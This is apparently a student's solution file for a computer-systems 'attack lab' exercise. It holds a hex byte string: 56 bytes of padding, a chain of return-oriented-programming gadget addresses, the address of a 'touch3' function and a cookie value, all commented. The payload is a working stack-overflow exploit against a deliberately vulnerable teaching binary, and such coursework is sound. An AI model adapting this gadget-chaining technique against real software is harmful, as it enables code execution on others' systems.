00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 56 bytes of padding */
0c 19 40 00 00 00 00 00 /* gadget 1 */
20 00 00 00 00 00 00 00 /* offset */
74 19 40 00 00 00 00 00 /* gadget 2 */
4c 19 40 00 00 00 00 00 /* gadget 3 */
87 19 40 00 00 00 00 00 /* gadget 4 */
aa 19 40 00 00 00 00 00 /* gadget 5 */
04 19 40 00 00 00 00 00 /* gadget 6 */
38 19 40 00 00 00 00 00 /* gadget 7 */
04 19 40 00 00 00 00 00 /* gadget 8 */
6d 18 40 00 00 00 00 00 /* touch3 function address */
34 65 39 39 63 62 31 62 /* cookie in text format, instead of hex, just like in phase 3 */
